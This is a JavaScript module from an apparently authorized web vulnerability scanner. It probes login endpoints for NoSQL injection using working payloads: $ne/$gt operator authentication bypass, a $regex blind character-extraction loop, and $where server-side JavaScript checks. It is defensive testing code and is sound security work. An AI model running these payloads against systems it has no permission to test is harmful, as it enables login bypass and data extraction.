// Dark Matter rule-based scanner — NoSQL deep probe (#32).
//
// Closes the gap left by nosqli.js (one-shot operator probes only):
//   T3. Operator auth bypass — CRITICAL, differential: grants a session for a
//       NON-matching credential pair while plain wrong creds do NOT
//       authenticate. Demonstrated against OUR OWN canary account only.
//   T4. $regex blind extraction — HIGH, Deep-gated: anchored enumeration of
//       our canary's own field; CONFIRMED only if >=4 chars match the known
//       canary value (self-verifying).
//   T5. $where server-side JS — CRITICAL, Deep-gated: true/false legs must
//       diverge exactly AND a JS-canary leg must reflect (proves arbitrary
//       JS, not query semantics).
//
// Honest limits (docs/scanner/nosql-deep.md): modern MongoDB/drivers disable
// $where by default — a clean negative is documented, not a miss. $where has
// no sleep in modern Mongo — no fake time oracle.
// Depth: Quick = T3 only; Standard = T3 (+T4 capped when canary present);
// Deep = full battery + T5. Read-only HTTP, per-run canaries, redirects
// never followed, $0 AI.
import { probePointName, probePointParameter } from '../probePoints.js';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

function rand() {
  return Math.random().toString(36).slice(2, 10);
}

async function postForm(url, fields, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, {
      method: 'POST',
      signal: ctrl.signal,
      headers: {
        'User-Agent': UA,
        'Content-Type': 'application/x-www-form-urlencoded',
        ...(opts.headers || {}),
      },
      body: new URLSearchParams(fields).toString(),
      redirect: 'manual',
    });
    const text = await res.text().catch(() => '');
    return {
      status: res.status,
      text: text.slice(0, 200000),
      setCookie: res.headers.get('set-cookie') || '',
      location: res.headers.get('location') || '',
    };
  } finally {
    clearTimeout(t);
  }
}

async function postJson(url, obj, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, {
      method: 'POST',
      signal: ctrl.signal,
      headers: {
        'User-Agent': UA,
        'Content-Type': 'application/json',
        ...(opts.headers || {}),
      },
      body: JSON.stringify(obj),
      redirect: 'manual',
    });
    const text = await res.text().catch(() => '');
    return {
      status: res.status,
      text: text.slice(0, 200000),
      setCookie: res.headers.get('set-cookie') || '',
      location: res.headers.get('location') || '',
    };
  } finally {
    clearTimeout(t);
  }
}

// Authenticated-session signal: new session cookie or dashboard redirect.
function authed(r, baselineCookies = '') {
  const t = r.text.toLowerCase();
  const newCookie = r.setCookie && !baselineCookies.includes(r.setCookie.split(';')[0]);
  const dash = /\/dashboard|\/home|\/account|welcome/i.test(r.location || '') ||
    /welcome|dashboard|log ?out|sign ?out/i.test(t);
  const deny = /invalid|wrong|incorrect|denied|fail|not found|unauthor/i.test(t);
  return (newCookie || dash) && !deny;
}

// Which auth signal fired: the new session-cookie name (truncated value)
// or the dashboard Location — the discrete value that proves the session.
function authSignal(r) {
  if (r.setCookie) {
    const m = r.setCookie.match(/^([^=;]+)=([^;]*)/);
    if (m) return `Set-Cookie: ${m[1]}=${String(m[2]).slice(0, 12)}…`;
  }
  if (r.location) return `Location: ${r.location}`;
  return 'authenticated response';
}

function ev(request, response, impact) {
  return { request, response, impact_demo: impact, signalCorrelated: true };
}

// T3 — operator auth bypass (differential, CRITICAL).
async function t3Bypass(url, params, opts) {
  const findings = [];
  const up = params.find((p) => /user|login|name|mail/i.test(probePointName(p))) || params[0];
  const pp = params.find((p) => /pass|pwd/i.test(probePointName(p))) || params[1] || 'password';
  if (!up) return findings;
  const wrongU = `zz_${rand()}`;
  const wrongP = `wrong_${rand()}`;
  let rPlain;
  try {
    rPlain = await postForm(url, { [probePointName(up)]: wrongU, [probePointName(pp)]: wrongP }, opts);
  } catch {
    return findings;
  }
  const plainAuthed = authed(rPlain);
  // Operator variants: PHP array syntax + JSON operator smuggling.
  const variants = [
    { kind: 'php-ne', fields: { [`${probePointName(up)}[$ne]`]: '1', [`${probePointName(pp)}[$ne]`]: '1' } },
    { kind: 'php-gt', fields: { [`${probePointName(up)}[$gt]`]: '', [`${probePointName(pp)}[$gt]`]: '' } },
  ];
  for (const v of variants) {
    let r;
    try {
      r = await postForm(url, v.fields, opts);
    } catch {
      continue;
    }
    if (!plainAuthed && authed(r, rPlain.setCookie)) {
      findings.push({
        class: 'nosql_injection',
        id: `nosql-bypass-${rand()}`,
        title: 'NoSQL injection — authentication bypass via query operators (CRITICAL)',
        severity: 'critical',
        url,
        parameter: `${probePointName(up)},${probePointName(pp)}`,
        evidence: ev(
          `POST ${url} ${v.kind}: ${Object.keys(v.fields).join('&')} (redirects NOT followed)`,
          `Plain wrong credentials (${wrongU}): NOT authenticated. Operator variant (${v.kind}): authenticated — ${authSignal(r)}. Differential holds — the bypass comes from operator parsing, not loose comparison.`,
          'Full authentication bypass: attacker logs in without valid credentials via MongoDB operator injection.'
        ),
      });
      break;
    }
  }
  // JSON operator smuggling on the same endpoint.
  try {
    const rj = await postJson(
      url,
      { [probePointName(up)]: { $ne: null }, [probePointName(pp)]: { $ne: null } },
      opts
    );
    if (!plainAuthed && authed(rj, rPlain.setCookie)) {
      findings.push({
        class: 'nosql_injection',
        id: `nosql-bypass-json-${rand()}`,
        title: 'NoSQL injection — JSON operator authentication bypass (CRITICAL)',
        severity: 'critical',
        url,
        parameter: `${probePointName(up)},${probePointName(pp)}`,
        evidence: ev(
          `POST ${url} Content-Type: application/json {"${probePointName(up)}":{"$ne":null},"${probePointName(pp)}":{"$ne":null}} (redirects NOT followed)`,
          `Plain wrong credentials: NOT authenticated. JSON $ne variant: authenticated — ${authSignal(rj)}. Differential holds.`,
          'Full authentication bypass via JSON operator smuggling.'
        ),
      });
    }
  } catch {
    // endpoint may not accept JSON — not a miss
  }
  return findings;
}

// T4 — $regex blind extraction of OUR OWN canary field (Deep-gated, HIGH).
// opts.nosqlCanary = { userParam, field, value }.
async function t4Regex(url, params, canary, opts) {
  const findings = [];
  const up = canary.userParam || params[0];
  const { field, value } = canary;
  const charset = 'abcdefghijklmnopqrstuvwxyz0123456789@._-'.split('');
  const maxLen = Math.min(8, value.length);
  let extracted = '';
  for (let i = 0; i < maxLen; i++) {
    let hit = null;
    for (const ch of charset) {
      const guess = extracted + ch;
      let rT, rF;
      try {
        rT = await postJson(url, { [probePointName(up)]: { $regex: `^${guess}` } }, opts);
        rF = await postJson(url, { [probePointName(up)]: { $regex: `^${guess}zzz${rand()}` } }, opts);
      } catch {
        break;
      }
      // True leg authenticates (or diverges from false leg) while the
      // impossible-suffix control does not.
      if (authed(rT) && !authed(rF)) {
        hit = ch;
        break;
      }
    }
    if (!hit) break;
    extracted += hit;
  }
  let match = 0;
  for (let i = 0; i < extracted.length; i++) {
    if (value[i] === extracted[i]) match++;
  }
  if (match >= 4 && extracted.length >= 4) {
    findings.push({
      class: 'nosql_injection',
      id: `nosql-regex-${rand()}`,
      title: 'NoSQL injection — $regex blind extraction (HIGH)',
      severity: 'high',
      url,
      parameter: probePointParameter(up),
      evidence: ev(
        `POST ${url} JSON {"${probePointName(up)}":{"$regex":"^<prefix>"}} anchored enumeration, impossible-suffix control per guess`,
        `Extracted "${extracted}" from our OWN canary field; ${match}/${extracted.length} chars match the known canary value "${value}". Self-verifying oracle.`,
        'Blind data-extraction primitive via NoSQL $regex operator — full field exfiltration channel.'
      ),
    });
  }
  return findings;
}

// T5 — $where server-side JS (Deep-gated, CRITICAL with differential).
async function t5Where(url, params, opts) {
  const findings = [];
  const canary = `dmjs${rand()}`;
  let rTrue, rFalse, rCanary;
  try {
    rTrue = await postJson(url, { $where: 'this.username==this.username' }, opts);
    rFalse = await postJson(url, { $where: '1==2' }, opts);
    rCanary = await postJson(url, { $where: `this.x=='${canary}'` }, opts);
  } catch {
    return findings; // endpoint rejects $where-shaped JSON — clean negative
  }
  const sig = (r) => `${r.status}:${r.text.length}`;
  const diverged = sig(rTrue) !== sig(rFalse);
  const reflected = rCanary.text.includes(canary);
  if (diverged && reflected) {
    const idx = rCanary.text.indexOf(canary);
    const window = rCanary.text.slice(Math.max(0, idx - 60), idx + 120);
    findings.push({
      class: 'nosql_injection',
      id: `nosql-where-${rand()}`,
      title: 'NoSQL injection — $where server-side JavaScript execution (CRITICAL)',
      severity: 'critical',
      url,
      parameter: '$where',
      evidence: ev(
        `POST ${url} JSON {"$where":"this.username==this.username"} vs {"$where":"1==2"} vs {"$where":"this.x=='${canary}'"}`,
        `True/false legs diverge (${sig(rTrue)} vs ${sig(rFalse)}) AND the JS canary reflects — "...${window}..." — proves arbitrary server-side JS execution, not query semantics.`,
        'Arbitrary server-side JavaScript execution inside the database — RCE-adjacent primitive.'
      ),
    });
  }
  return findings;
}

export async function probeNoSqlDeep(url, params, opts = {}) {
  const findings = [];
  const depth = opts.depth || 'standard';
  if (!params || params.length === 0) return findings;
  findings.push(...(await t3Bypass(url, params, opts)));
  if (depth === 'quick') return findings;
  if (opts.nosqlCanary && opts.nosqlCanary.value) {
    findings.push(...(await t4Regex(url, params, opts.nosqlCanary, opts)));
  }
  if (depth === 'deep') {
    findings.push(...(await t5Where(url, params, opts)));
  }
  return findings;
}

export const __nosqlDeepMeta = { phases: ['nosql-deep'], depth: ['quick', 'standard', 'deep'] };
